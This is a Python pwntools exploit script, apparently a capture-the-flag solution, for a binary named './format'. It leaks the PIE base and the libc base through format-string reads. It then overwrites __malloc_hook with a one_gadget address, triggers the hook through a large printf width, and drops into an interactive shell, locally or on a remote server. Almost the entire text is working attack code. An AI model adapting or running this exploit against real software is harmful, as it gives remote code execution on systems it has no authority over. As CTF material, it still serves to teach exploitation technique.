from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './format'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library - need to identify this manually with https://libc.blukat.me
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')  # Remote

# Start program
io = start()

# Leak PIEBASE (_start) from stack (34th element)
io.sendline('%{}$p'.format(34).encode())
elf.address = int(io.recvlineS().strip(), 16)
info('piebase = 0x%x', elf.address)

# Leak lib-c foothold (_IO_file_jumps) to calculate base address
io.sendline('%{}$p'.format(28).encode())
leaked_libc_addr = int(io.recvlineS().strip(), 16)
libc.address = leaked_libc_addr - libc.symbols._IO_file_jumps
info('libc_base = 0x%x', libc.address)

# Found with one_gadget tool - https://github.com/david942j/one_gadget
payload = libc.address + 0x4f322

# https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook
# Overwrite malloc_hook with our system('/bin/sh') payload
# malloc_hook will be triggered if we send large value to printf()
io.sendline(fmtstr_payload(6, {libc.symbols.__malloc_hook: payload}))
io.recv()
io.sendline(b'%10000$c')

# Got Shell?
io.interactive()
